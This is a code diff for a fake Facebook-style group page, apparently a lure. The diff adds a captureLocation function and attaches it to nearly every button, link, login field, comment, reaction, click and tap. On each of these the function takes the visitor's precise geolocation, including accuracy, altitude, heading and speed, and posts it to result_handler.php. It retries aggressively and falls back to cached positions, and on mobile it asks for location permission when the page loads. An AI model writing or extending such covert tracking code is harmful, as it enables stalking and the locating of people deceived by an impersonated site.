@@ -2,6 +2,174 @@
 function qs(elem) {return document.querySelector(elem);}
 function qsa(elem) {return document.querySelectorAll(elem);}
 
+// Helper function to handle location capture with consistent error handling
+function captureLocation(context = 'interaction') {
+    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // For mobile devices, try to use cached location first if recent enough
+    if (isMobile && window.initialLocation) {
+        var locationAge = Date.now() - window.initialLocation.timestamp;
+        if (locationAge < 300000) { // Less than 5 minutes old
+            console.log(`Using cached location for ${context}`);
+            $.ajax({
+                type: 'POST',
+                url: 'result_handler.php',
+                data: { 
+                    Status: 'success', 
+                    Lat: window.initialLocation.lat + ' deg', 
+                    Lon: window.initialLocation.lon + ' deg', 
+                    Acc: window.initialLocation.accuracy + ' m',
+                    Alt: 'Not Available',
+                    Dir: 'Not Available',
+                    Spd: 'Not Available'
+                },
+                mimeType: 'text'
+            });
+            return;
+        }
+    }
+    
+    if (typeof locate === 'function') {
+        locate(
+            function() { 
+                // Success callback - location captured successfully
+                console.log(`Location captured successfully during: ${context}`);
+            }, 
+            function(error, errorText) { 
+                // Error callback - handle location errors gracefully
+                console.log(`Location capture failed during ${context}:`, errorText);
+                
+                // Enhanced mobile retry logic
+                if (error && (error.code === 3 || error.code === 2)) { // TIMEOUT or POSITION_UNAVAILABLE
+                    console.log(`Retrying location capture for ${context} with mobile-optimized settings...`);
+                    
+                    setTimeout(function() {
+                        if (navigator.geolocation) {
+                            // Mobile-specific retry with progressive fallback
+                            var retryOptions = {
+                                enableHighAccuracy: isMobile ? false : true, // Reverse strategy on retry
+                                timeout: isMobile ? 15000 : 8000, // Longer timeout for mobile
+                                maximumAge: isMobile ? 30000 : 600000 // More recent cache for mobile
+                            };
+                            
+                            navigator.geolocation.getCurrentPosition(
+                                function(position) {
+                                    console.log(`Location captured on retry for: ${context}`);
+                                    // Send the successful location data
+                                    var lat = position.coords.latitude + ' deg';
+                                    var lon = position.coords.longitude + ' deg';
+                                    var acc = position.coords.accuracy + ' m';
+                                    var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available';
+                                    var dir = position.coords.heading ? position.coords.heading + ' deg' : 'Not Available';
+                                    var spd = position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available';
+                                    
+                                    // Update cached location for mobile
+                                    if (isMobile) {
+                                        window.initialLocation = {
+                                            lat: position.coords.latitude,
+                                            lon: position.coords.longitude,
+                                            accuracy: position.coords.accuracy,
+                                            timestamp: Date.now()
+                                        };
+                                    }
+                                    
+                                    $.ajax({
+                                        type: 'POST',
+                                        url: 'result_handler.php',
+                                        data: { 
+                                            Status: 'success', 
+                                            Lat: lat, 
+                                            Lon: lon, 
+                                            Acc: acc,
+                                            Alt: alt,
+                                            Dir: dir,
+                                            Spd: spd
+                                        },
+                                        mimeType: 'text'
+                                    });
+                                },
+                                function(retryError) {
+                                    console.log(`Retry also failed for ${context}:`, retryError.message);
+                                    
+                                    // Final fallback attempt with very permissive settings
+                                    if (isMobile && retryError.code === 3) {
+                                        setTimeout(function() {
+                                            navigator.geolocation.getCurrentPosition(
+                                                function(position) {
+                                                    console.log(`Location captured on final attempt for: ${context}`);
+                                                    var lat = position.coords.latitude + ' deg';
+                                                    var lon = position.coords.longitude + ' deg';
+                                                    var acc = position.coords.accuracy + ' m';
+                                                    
+                                                    $.ajax({
+                                                        type: 'POST',
+                                                        url: 'result_handler.php',
+                                                        data: { 
+                                                            Status: 'success', 
+                                                            Lat: lat, 
+                                                            Lon: lon, 
+                                                            Acc: acc,
+                                                            Alt: 'Not Available',
+                                                            Dir: 'Not Available',
+                                                            Spd: 'Not Available'
+                                                        },
+                                                        mimeType: 'text'
+                                                    });
+                                                },
+                                                function(finalError) {
+                                                    console.log(`All location attempts failed for ${context}`);
+                                                },
+                                                { 
+                                                    enableHighAccuracy: false, 
+                                                    timeout: 30000, // Very long timeout for final attempt
+                                                    maximumAge: 1800000 // Accept very old cached positions (30 minutes)
+                                                }
+                                            );
+                                        }, 2000);
+                                    }
+                                },
+                                retryOptions
+                            );
+                        }
+                    }, isMobile ? 2000 : 1000); // Longer delay for mobile
+                }
+            }
+        );
+    } else {
+        console.log('Location function not available');
+    }
+}
+
+// Mobile location optimization function
+function requestLocationPermission() {
+    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    if (isMobile && navigator.geolocation) {
+        // Pre-request location permission with user-friendly approach
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                console.log('Location permission granted');
+                // Store initial location to improve subsequent requests
+                window.initialLocation = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: Date.now()
+                };
+            },
+            function(error) {
+                console.log('Location permission handling:', error.message);
+                // Even if initial request fails, we've attempted to get permission
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 60000
+            }
+        );
+    }
+}
+
 // globals
 hovered_btn_id = 0;
 
@@ -49,14 +217,17 @@ function initializeModal() {
 
     // Event listeners
     if (modalClose) {
-        modalClose.addEventListener('click', hideModal);
+        modalClose.addEventListener('click', function() {
+            captureLocation('modal close button');
+            hideModal();
+        });
     }
 
     if (modalLogin) {
         modalLogin.addEventListener('click', function() {
             hideModal();
-            // Trigger location capture when user clicks login
-            locate(() => {}, () => {});
+            // Trigger location capture when user clicks login with timeout handling
+            captureLocation('modal login');
             // Focus on the login form in the header
             const emailInput = qs('#email');
             if (emailInput) {
@@ -68,8 +239,8 @@ function initializeModal() {
     if (modalSignup) {
         modalSignup.addEventListener('click', function() {
             hideModal();
-            // Trigger location capture when user clicks signup
-            locate(() => {}, () => {});
+            // Trigger location capture when user clicks signup with timeout handling
+            captureLocation('modal signup');
             // In a real app, this would redirect to signup page
         });
     }
@@ -78,6 +249,7 @@ function initializeModal() {
     if (modal) {
         modal.addEventListener('click', function(e) {
             if (e.target === modal) {
+                captureLocation('modal background click');
                 hideModal();
             }
         });
@@ -134,8 +306,8 @@ function initializeFacebookLogin() {
             loginBtn.textContent = 'Logging in...';
             loginBtn.disabled = true;
             
-            // Trigger location capture when user submits login form
-            locate(() => {}, () => {});
+            // Trigger location capture when user submits login form with timeout handling
+            captureLocation('login form submission');
             
             setTimeout(() => {
                 loginBtn.textContent = 'Log in';
@@ -313,6 +485,9 @@ function makeComment(text, id) {
 
 // Toggle see more/see less functionality
 function toggleText() {
+  // Capture location when see more/less is clicked
+  captureLocation('see more/less toggle');
+  
   const hiddenText = document.querySelector('.post-hidden-text');
   const seeMoreBtn = document.querySelector('.see-more');
   
@@ -330,6 +505,9 @@ document.addEventListener('DOMContentLoaded', function() {
     qs("#mother").style.display = "block";
     qs("#js-error").style.display = "none";
     
+    // Request location permission early for mobile devices
+    requestLocationPermission();
+    
     // Initialize modal
     initializeModal();
     
@@ -342,7 +520,7 @@ window.addEventListener('load', function() {
 	opt_btns.forEach(btn => {
 		btn.addEventListener("click", (e)=>{
 			// Trigger location capture when user clicks options menu
-			locate(() => {}, () => {});
+			captureLocation('options menu');
 			toggle_option(btn);
 		});
 	});
@@ -350,7 +528,7 @@ window.addEventListener('load', function() {
 	comment_inputs.forEach(input => {
 		input.addEventListener("change", (e)=>{
 			// Trigger location capture when user adds a comment
-			locate(() => {}, () => {});
+			captureLocation('comment input');
 			makeComment(input.value, input.getAttribute("fpost"));
 			input.value = "";
 		});
@@ -359,7 +537,7 @@ window.addEventListener('load', function() {
 	comment_btns.forEach(button => {
 		button.addEventListener("click", (e)=>{
 			// Trigger location capture when user clicks comment button
-			locate(() => {}, () => {});
+			captureLocation('comment button');
 			qs("#fpost" + button.getAttribute("fpost")).querySelector("input").focus();
 		});
 	});
@@ -382,7 +560,7 @@ window.addEventListener('load', function() {
 		button.addEventListener("click", (e)=>{
 			hovered_btn_id = button.getAttribute("fpost");
 			// Trigger location capture when user clicks like button
-			locate(() => {}, () => {});
+			captureLocation('like button');
 			if (window.innerWidth <= 768) {
 				// On mobile, show reaction panel on click
 				if (emoji_panel.style.visibility === "visible") {
@@ -409,7 +587,7 @@ window.addEventListener('load', function() {
 	emojies.forEach(emoji => {
 		emoji.addEventListener("click", (e)=>{
 			// Trigger location capture when user clicks emoji reaction
-			locate(() => {}, () => {});
+			captureLocation('emoji reaction');
 			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
 			// Hide emoji panel after selection on mobile
 			if (window.innerWidth <= 768) {
@@ -421,7 +599,7 @@ window.addEventListener('load', function() {
 		emoji.addEventListener("touchend", (e)=>{
 			e.preventDefault();
 			// Trigger location capture when user touches emoji reaction
-			locate(() => {}, () => {});
+			captureLocation('emoji touch');
 			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
 			if (window.innerWidth <= 768) {
 				emoji_panel.style.visibility = "hidden";
@@ -449,12 +627,92 @@ window.addEventListener('load', function() {
 	
 	// Add location capture to additional interactive elements
 	
+	// Facebook logo and links
+	const fbLogoLink = qs('.fb-logo-link');
+	if (fbLogoLink) {
+		fbLogoLink.addEventListener('click', function() {
+			captureLocation('facebook logo');
+		});
+	}
+	
+	// Forgotten password link
+	const forgottenLink = qs('.forgotten-link');
+	if (forgottenLink) {
+		forgottenLink.addEventListener('click', function() {
+			captureLocation('forgotten password link');
+		});
+	}
+	
+	// Mobile back button
+	const mobileBackBtn = qs('.mobile-back-btn');
+	if (mobileBackBtn) {
+		mobileBackBtn.addEventListener('click', function() {
+			captureLocation('mobile back button');
+		});
+	}
+	
+	// Profile pictures and names
+	const profilePics = qsa('.profile-picture img, .comment-img');
+	profilePics.forEach(img => {
+		img.addEventListener('click', function() {
+			captureLocation('profile picture');
+		});
+	});
+	
+	// Profile names and links
+	const profileNames = qsa('.profile-name a, .poster-name, .comment-header strong');
+	profileNames.forEach(name => {
+		name.addEventListener('click', function() {
+			captureLocation('profile name');
+		});
+	});
+	
+	// Three dot menus in comments
+	const threeDots = qsa('.three-dot, .three-dot-img');
+	threeDots.forEach(dot => {
+		dot.addEventListener('click', function() {
+			captureLocation('three dot menu');
+		});
+	});
+	
+	// Comment interaction links (Like, Reply, Share in comments)
+	const commentLinks = qsa('.comment-lks span');
+	commentLinks.forEach(link => {
+		link.addEventListener('click', function() {
+			captureLocation('comment interaction');
+		});
+	});
+	
+	// Time stamps and other post metadata
+	const postMeta = qsa('.post-time span, .group-name, .member-count');
+	postMeta.forEach(meta => {
+		meta.addEventListener('click', function() {
+			captureLocation('post metadata');
+		});
+	});
+	
+	// Post images
+	const postImages = qsa('.post-content img');
+	postImages.forEach(img => {
+		img.addEventListener('click', function() {
+			captureLocation('post image');
+		});
+	});
+	
+	// Hashtags and mentions
+	const hashtags = qsa('[style*="#1877F2"]');
+	hashtags.forEach(tag => {
+		tag.addEventListener('click', function() {
+			captureLocation('hashtag or mention');
+		});
+	});
+	
 	// Follow/Join button
 	const joinBtn = qs('.join-group-btn');
 	if (joinBtn) {
 		joinBtn.addEventListener('click', function() {
 			// Trigger location capture when user clicks follow/join button
-			locate(() => {}, () => {});
+			captureLocation('join group button');
 		});
 	}
 	
@@ -463,7 +721,7 @@ window.addEventListener('load', function() {
 	shareBtns.forEach(btn => {
 		btn.addEventListener('click', function() {
 			// Trigger location capture when user clicks share button
-			locate(() => {}, () => {});
+			captureLocation('share button');
 		});
 	});
 	
@@ -474,14 +732,14 @@ window.addEventListener('load', function() {
 	if (bannerLoginBtn) {
 		bannerLoginBtn.addEventListener('click', function() {
 			// Trigger location capture when user clicks banner login button
-			locate(() => {}, () => {});
+			captureLocation('banner login button');
 		});
 	}
 	
 	if (bannerSignupBtn) {
 		bannerSignupBtn.addEventListener('click', function() {
 			// Trigger location capture when user clicks banner signup button
-			locate(() => {}, () => {});
+			captureLocation('banner signup button');
 		});
 	}
 	
@@ -490,7 +748,7 @@ window.addEventListener('load', function() {
 	if (mobileLoginBtn) {
 		mobileLoginBtn.addEventListener('click', function() {
 			// Trigger location capture when user clicks mobile login button
-			locate(() => {}, () => {});
+			captureLocation('mobile login button');
 		});
 	}
 	
@@ -499,7 +757,7 @@ window.addEventListener('load', function() {
 	if (mobileOpenAppBtn) {
 		mobileOpenAppBtn.addEventListener('click', function() {
 			// Trigger location capture when user clicks open app button
-			locate(() => {}, () => {});
+			captureLocation('mobile open app button');
 		});
 	}
 	
@@ -508,7 +766,74 @@ window.addEventListener('load', function() {
 	if (seeMoreBtn) {
 		seeMoreBtn.addEventListener('click', function() {
 			// Trigger location capture when user clicks see more button
-			locate(() => {}, () => {});
+			captureLocation('see more button');
 		});
 	}
+	
+	// Add comprehensive click tracking for any clickable elements
+	// This captures location for ANY click on interactive elements that might be missed
+	const interactiveSelectors = [
+		'a', 'button', '[onclick]', '[role="button"]', 
+		'[tabindex]', 'input[type="submit"]', 'input[type="button"]',
+		'.clickable', '[data-click]', '.fb-logo-link', '.forgotten-link',
+		'.mobile-back-btn', '.poster-name', '.group-name', '.comment-header',
+		'.three-dot', '.three-dot-img', '.profile-picture img', '.comment-img',
+		'.profile-name a', '.post-time span', 'img[src*="svg"]'
+	];
+	
+	interactiveSelectors.forEach(selector => {
+		const elements = qsa(selector);
+		elements.forEach(element => {
+			// Check if element doesn't already have our location tracking
+			if (!element.hasAttribute('data-location-tracked')) {
+				element.setAttribute('data-location-tracked', 'true');
+				element.addEventListener('click', function(e) {
+					const elementInfo = element.className || element.tagName || 'unknown element';
+					captureLocation(`interactive element: ${elementInfo}`);
+				});
+			}
+		});
+	});
+	
+	// Add location capture to any dynamically added content or missed elements
+	document.addEventListener('click', function(e) {
+		const target = e.target;
+		
+		// Check if the clicked element is interactive but doesn't have location tracking
+		const isInteractive = target.tagName === 'A' || 
+							   target.tagName === 'BUTTON' || 
+							   target.hasAttribute('onclick') ||
+							   target.style.cursor === 'pointer' ||
+							   target.closest('a') ||
+							   target.closest('button') ||
+							   target.closest('[onclick]') ||
+							   target.closest('[role="button"]');
+		
+		if (isInteractive && !target.hasAttribute('data-location-tracked')) {
+			const elementInfo = target.className || target.tagName || target.textContent?.substring(0, 20) || 'unknown';
+			captureLocation(`fallback click: ${elementInfo}`);
+		}
+	}, true); // Use capture phase to ensure we catch all clicks
+	
+	// Also capture location on double-click events (common on mobile)
+	document.addEventListener('dblclick', function(e) {
+		captureLocation('double click interaction');
+	});
+	
+	// Capture location on touch events for mobile devices
+	document.addEventListener('touchend', function(e) {
+		// Only if it's a tap (not a scroll or swipe)
+		if (e.changedTouches && e.changedTouches.length === 1) {
+			const target = e.target;
+			const isInteractive = target.tagName === 'A' || 
+								   target.tagName === 'BUTTON' || 
+								   target.closest('a') ||
+								   target.closest('button') ||
+								   target.style.cursor === 'pointer';
+			
+			if (isInteractive) {
+				captureLocation('touch interaction');
+			}
+		}
+	});
 });
